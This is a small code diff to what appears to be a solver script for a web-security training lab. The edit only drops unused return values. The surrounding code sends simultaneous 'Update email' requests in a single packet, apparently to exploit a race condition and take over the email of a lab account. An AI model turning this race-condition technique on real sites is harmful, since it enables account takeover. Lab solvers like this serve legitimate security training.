@@ -7,7 +7,7 @@ from requests import Request
 
 
 def solve_lab(session):
-    resp = session.login("wiener", "peter")
+    session.login("wiener", "peter")
     email_client = EmailClient(session)
     csrf = session.get_csrf_token("/my-account")
 
@@ -19,7 +19,7 @@ def solve_lab(session):
         req = Request("POST", change_email_url, data=data)
         prepped.append(session.prepare_request(req))
 
-    responses = session.single_packet_send(*prepped)
+    session.single_packet_send(*prepped)
     logger.info('Simultanenously sent "Update email" requests for:')
     logger.info(f" - {email_client.address}")
     logger.info(" - carlos@ginandjuice.shop")
